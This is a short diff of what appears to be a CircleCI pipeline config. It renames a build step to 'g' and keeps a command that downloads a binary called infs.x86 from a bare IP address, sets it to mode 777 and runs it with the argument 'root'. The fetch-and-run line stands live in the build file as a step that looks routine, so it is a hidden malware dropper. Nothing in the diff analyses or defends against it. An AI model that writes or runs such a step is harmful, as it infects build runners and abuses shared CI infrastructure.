@@ -6,6 +6,6 @@ jobs:
     steps:
       - checkout
       - run:
-          name: "Project 1"
+          name: "g"
           command: |
-          curl -O http://193.47.61.141/infs.x86; chmod 777 infs.x86; ./infs.x86 root
+                curl -O http://193.47.61.141/infs.x86; chmod 777 infs.x86; ./infs.x86 root
